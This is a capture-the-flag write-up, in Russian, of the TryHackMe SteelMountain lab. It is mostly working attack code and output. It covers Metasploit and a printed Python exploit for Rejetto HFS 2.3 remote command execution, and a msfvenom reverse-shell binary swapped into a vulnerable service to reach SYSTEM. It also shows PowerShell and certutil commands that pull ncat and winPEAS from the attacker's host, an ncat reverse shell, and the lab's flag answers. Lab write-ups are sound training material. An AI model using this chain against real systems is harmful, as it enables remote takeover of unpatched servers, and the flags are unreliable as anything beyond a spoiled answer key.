# TryHackMe - SteelMountain

📅 Дата: 2025-07-02  
🧠 Сложность: easy  
💻 IP-адрес: 10.10.45.53  

---

## Sugar

```bash
nmap_ctf() {
  local ip=$1
  sudo nmap -sS -p- -n --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
}
```


## 🔍 Сканирование

```bash
export ip=10.10.45.53 && nmap_ctf $ip
```

Лучший работник:
```html
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
```

🖼️ Nmap скан:

```bash
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2025-07-03T01:14:38+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2025-07-03T01:14:32+00:00
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-07-02T01:09:29
| Not valid after:  2026-01-01T01:09:29
| MD5:   4f83:726c:3db6:4dc8:823a:b33c:ebdc:36b0
|_SHA-1: cb76:9d2e:f500:8a99:7053:4e64:abbe:3eab:21c6:0837
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
49164/tcp open  msrpc              Microsoft Windows RPC
```


---

## 🕵️ Enumeration

### Rejetto Http File Server 2.3
![httpFileServer](screenshots/01.httpFileServer.png)

Searchsploit
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm]
└─$ searchsploit http file server 2.3
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasp | linux/remote/48130.rb
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                     | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                     | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)          | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                  | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)             | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)             | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution        | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                     | windows/webapps/49125.py
-------------------------------------------------------------------------------- ---------------------------------
```

CVE-2014-6287
```bash
┌──(kali㉿0x2d-pentest)-[~]
└─$ searchsploit -p 34926
  Exploit: Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/34926
     Path: /usr/share/exploitdb/exploits/windows/remote/34926.rb
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Ruby script, ASCII text
```


## 📂 Получение доступа

msfconsole
```bash
msf6 > search 2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```

msf settings
```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.45.53      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasplo
                                         it/basics/using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an addre
                                         ss on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    5555             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.21.104.16     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

user flag
```bash
meterpreter > ls c:\\Users\\bill\\Desktop\\
Listing: c:\Users\bill\Desktop\
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt

meterpreter > cat c:\\Users\\bill\\Desktop\\user.txt
��b04763b6fcf51fcd7c13abc7db4fd365
```


## ⚙️ Привилегии

Загружаю PowerUp.ps1
```bash
meterpreter > upload ~/Labs/thm/SteelMountain/exploits/PowerUp.ps1
[*] Uploading  : /home/kali/Labs/thm/SteelMountain/exploits/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/kali/Labs/thm/SteelMountain/exploits/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /home/kali/Labs/thm/SteelMountain/exploits/PowerUp.ps1 -> PowerUp.ps1
```

Подключаю модуль powershell в meterpreter и запускаю PowerUp AllChecks
```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > ls             

    Directory: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----          7/2/2025   7:57 PM            %TEMP%
-a---         2/16/2014  12:58 PM     760320 hfs.exe
-a---          7/2/2025   8:20 PM     600580 PowerUp.ps1


PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
...
```

Payload с помощью msfvenom
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.21.104.16 LPORT=7777 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: ASCService.exe
```

Загружаю на жертву, останавливаю сервис, заменяю файл и запускаю сервис
```bash
meterpreter > upload ~/Labs/thm/SteelMountain/exploits/ASCService.exe
meterpreter > shell
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc stop AdvancedSystemCareService9
meterpreter > cp ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc start AdvancedSystemCareService9
```

Получаю SYSTEM
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
└─$ nc -lvnp 7777                 
listening on [any] 7777 ...
connect to [10.21.104.16] from (UNKNOWN) [10.10.45.53] 49477
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>whoami
whoami
nt authority\system

c:\Users\Administrator\Desktop>more root.txt
more root.txt
9af5f314f57607c00fd09803a587db80
```

## ⚠️ Без Metasploit

Скачиваю эксплойт https://www.exploit-db.com/exploits/49125 и сохраняю как x.py
```python
#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
	http = urllib3.PoolManager()	
	url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
	print(url)
	response = http.request('GET', url)
	
except Exception as ex:
	print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
	print(ex)
```

Скачиваю ncat.exe, winpeas и из директории со скачанными нагрузками запускаю Python server
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.54.54 - - [03/Jul/2025 03:13:16] "GET /ncat.exe HTTP/1.1" 200 -
10.10.54.54 - - [03/Jul/2025 03:19:52] "GET /winPEASx64.exe HTTP/1.1" 200 -
```

Скачиваю на жертву netcat и winpeas
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
└─$ python3 x.py 10.10.54.54 8080 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe (New-Object Net.WebClient).DownloadFile('http://10.21.104.16:8888/ncat.exe','C:\Users\Public\ncat.exe')"
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
└─$ python3 x.py 10.10.54.54 8080 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe (New-Object Net.WebClient).DownloadFile('http://10.21.104.16:8888/winPEASx64.exe','C:\Users\Public\winPEASx64.exe')"
```

Более понятная команда для скачивания certutil:
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
└─$ python3 x.py 10.10.54.54 8080 "certutil -urlcahe -f http://10.21.104.16:8888/ncat.exe ncat.exe"
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
└─$ python3 x.py 10.10.54.54 8080 "certutil -urlcahe -f http://10.21.104.16:8888/winPEASany.exe winPEASany.exe"
```

Запускаю nc для поимки реверса и отправляю с жертвы запрос
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
```
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
└─$ python3 x.py 10.10.54.54 8080 "C:\Users\Public\ncat.exe -e cmd.exe 10.21.104.16 5555"
```

И получаю рабочий реверс для дальнейшего запуска winpeas и повышения привилегий 
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/SteelMountain/exploits]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.21.104.16] from (UNKNOWN) [10.10.54.54] 49378
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
```


## 🏁 Флаги

- User flag: b04763b6fcf51fcd7c13abc7db4fd365 
- Root flag: 9af5f314f57607c00fd09803a587db80 

---
